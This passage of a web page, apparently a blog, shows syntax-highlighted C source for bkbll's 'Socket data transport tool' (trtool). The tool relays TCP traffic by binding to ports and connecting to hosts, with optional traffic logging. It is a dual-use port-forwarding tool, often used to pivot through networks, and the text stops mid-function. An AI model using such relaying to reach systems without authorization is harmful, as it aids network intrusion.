class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Socket data transport tool</span></span><br><span class="line"><span class="comment">* by bkbll(bkbll@cnhonker.net)</span></span><br><span class="line"><span class="comment">* [bkbll@mobile socket]$ uname -a</span></span><br><span class="line"><span class="comment">* Linux mobile 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux</span></span><br><span class="line"><span class="comment">* [bkbll@mobile socket]$ gcc -o trtool trtool.c</span></span><br><span class="line"><span class="comment">* [bkbll@mobile socket]$ ./trtool</span></span><br><span class="line"><span class="comment">* Socket data transport tool</span></span><br><span class="line"><span class="comment">* by bkbll(bkbll@cnhonker.net)</span></span><br><span class="line"><span class="comment">* Usage:./trtool -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]</span></span><br><span class="line"><span class="comment">* -v: version</span></span><br><span class="line"><span class="comment">* -h1: host1</span></span><br><span class="line"><span class="comment">* -h2: host2</span></span><br><span class="line"><span class="comment">* -p1: port1</span></span><br><span class="line"><span class="comment">* -p2: port2</span></span><br><span class="line"><span class="comment">* -log: log the data</span></span><br><span class="line"><span class="comment">* -m: the action method for this tool</span></span><br><span class="line"><span class="comment">* 1: listen on PORT1 and connect to HOST2:PORT2</span></span><br><span class="line"><span class="comment">* 2: listen on PORT1 and PORT2</span></span><br><span class="line"><span class="comment">* 3: connect to HOST1:PORT1 and HOST2:PORT2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VERSION <span class="meta-string">&quot;2.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMEOUT 300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) (a)&gt;(b)?(a):(b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 10240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOSTLEN 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT_NUMBER 5</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* define function here */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *s)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transdata</span><span class="params">(<span class="keyword">int</span> fd1,<span class="keyword">int</span> fd2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">closeallfd</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makelog</span><span class="params">(<span class="keyword">char</span> *buffer,<span class="keyword">int</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">testifisvalue</span><span class="params">(<span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind2conn</span><span class="params">(<span class="keyword">int</span> port1,<span class="keyword">char</span> *host,<span class="keyword">int</span> port2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind2bind</span><span class="params">(<span class="keyword">int</span> port1,<span class="keyword">int</span> port2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conn2conn</span><span class="params">(<span class="keyword">char</span> *host1,<span class="keyword">int</span> port1,<span class="keyword">char</span> *host2,<span class="keyword">int</span> port2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_serv</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">char</span>* server,<span class="keyword">int</span> port)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* define GLOBAL varible here */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> errno;</span><br><span class="line">FILE *fp;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> **p;</span><br><span class="line">    <span class="keyword">char</span> host1[HOSTLEN],host2[HOSTLEN];</span><br><span class="line">    <span class="keyword">int</span> port1=<span class="number">0</span>,port2=<span class="number">0</span>,method=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    <span class="keyword">char</span> *logfile=<span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    p=argv;</span><br><span class="line">    <span class="built_in">memset</span>(host1,<span class="number">0</span>,HOSTLEN);</span><br><span class="line">    <span class="built_in">memset</span>(host2,<span class="number">0</span>,HOSTLEN);</span><br><span class="line">    <span class="keyword">while</span>(*p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-v&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Socket data transport tool.\r\nVersion:%s\r\n&quot;</span>,VERSION);</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-h1&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                length=(<span class="built_in">strlen</span>(*(p+<span class="number">1</span>))&gt;HOSTLEN<span class="number">-1</span>)?HOSTLEN<span class="number">-1</span>:<span class="built_in">strlen</span>(*(p+<span class="number">1</span>));</span><br><span class="line">                <span class="built_in">strncpy</span>(host1,*(++p),length);</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-h2&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                length=(<span class="built_in">strlen</span>(*(p+<span class="number">1</span>))&gt;HOSTLEN<span class="number">-1</span>)?HOSTLEN<span class="number">-1</span>:<span class="built_in">strlen</span>(*(p+<span class="number">1</span>));</span><br><span class="line">                <span class="built_in">strncpy</span>(host2,*(++p),length);</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-p1&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">                port1=atoi(*(++p));</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-p2&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">                port2=atoi(*(++p));</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-m&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">                method=atoi(*(++p));</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(*p,<span class="string">&quot;-log&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(testifisvalue(*(p+<span class="number">1</span>))==<span class="number">1</span>)</span><br><span class="line">                logfile=*(++p);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply logfile name\r\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGCLD,SIG_IGN);</span><br><span class="line">    signal(SIGINT,&amp;closeallfd);</span><br><span class="line">    <span class="keyword">if</span>(logfile !=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        fp=fopen(logfile,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;open logfile&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    makelog(<span class="string">&quot;######################## start ################\r\n&quot;</span>,<span class="number">49</span>);</span><br><span class="line">    <span class="keyword">switch</span>(method)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span>((port1==<span class="number">0</span>) || (port2==<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply PORT1 and PORT2.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(host2)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply HOST2.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bind2conn(port1,host2,port2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span>((port1==<span class="number">0</span>) || (port2==<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply PORT1 and PORT2.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bind2bind(port1,port2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span>((port1==<span class="number">0</span>) || (port2==<span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply PORT1 and PORT2.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(host1)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply HOST1.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(host2)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[ERROR]:must supply HOST2.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        conn2conn(host1,port1,host2,port2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    closeallfd(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">testifisvalue</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="literal">NULL</span> ) <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>) <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Socket data transport tool\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;by bkbll(bkbll@cnhonker.net)\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]\r\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -v: version\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -h1: host1\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -h2: host2\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -p1: port1\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -p2: port2\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -log: log the data\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; -m: the action method for this tool\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; 1: listen on PORT1 and connect to HOST2:PORT2\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; 2: listen on PORT1 and PORT2\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; 3: connect to HOST1:PORT1 and HOST2:PORT2\r\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    closeallfd(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind2conn</span><span class="params">(<span class="keyword">int</span> port1,<span class="keyword">char</span> *host,<span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd,sockfd1,sockfd2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">remote</span>;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memset</span>(buffer,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>((sockfd=create_socket())==<span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(create_serv(sockfd,port1)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        close(sockfd1);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    size=<span class="keyword">sizeof</span>(struct sockaddr);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waiting for response.........\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>((sockfd1=accept(sockfd,(struct sockaddr *)&amp;remote,(<span class="keyword">socklen_t</span> *)&amp;size))&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;accept error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept a client from %s:%d\n&quot;</span>,inet_ntoa(remote.sin_addr),ntohs(remote.sin_port));</span><br><span class="line">        <span class="keyword">if</span>((sockfd2=create_socket())==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            close(sockfd1);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;make a connection to %s:%d....&quot;</span>,host,port2);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">if</span>(client_connect(sockfd2,host,port2)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            close(sockfd2);</span><br><span class="line">            <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;[SERVER]connection to %s:%d error\r\n&quot;</span>,host,port2);</span><br><span class="line">            write(sockfd1,buffer,<span class="built_in">strlen</span>(buffer));</span><br><span class="line">            <span class="built_in">memset</span>(buffer,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">            close(sockfd1);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ok\r\n&quot;</span>);</span><br><span class="line">        pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>) transdata(sockfd1,sockfd2);</span><br><span class="line">        <span class="comment">// sleep(2);</span></span><br><span class="line">        close(sockfd1);</span><br><span class="line">        close(sockfd2);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind2bind</span><span class="params">(<span class="keyword">int</span> port1,<span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2,sockfd1,sockfd2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client1</span>,<span class="title">client2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> size1,size2;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((fd1=create_socket())==<span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>((fd2=create_socket())==<span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;binding port %d......&quot;</span>,port1);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span>(create_serv(fd1,port1)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        close(fd1);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;binding port %d......&quot;</span>,port2);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span>(create_serv(fd2,port2)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        close(fd2);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok\r\n&quot;</span>);</span><br><span class="line">    size1=size2=<span class="keyword">sizeof</span>(struct sockaddr);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waiting for response on port %d.........\n&quot;</span>,port1);</span><br><span class="line">        <span class="keyword">if</span>((sockfd1=accept(fd1,(struct sockaddr *)&amp;client1,(<span class="keyword">socklen_t</span> *)&amp;size1))&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;accept1 error&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept a client on port %d from %s,waiting another on port %d....\n&quot;</span>,port1,inet_ntoa(client1.sin_addr),port2);</span><br><span class="line">        <span class="keyword">if</span>((sockfd2=accept(fd2,(struct sockaddr *)&amp;client2,(<span class="keyword">socklen_t</span> 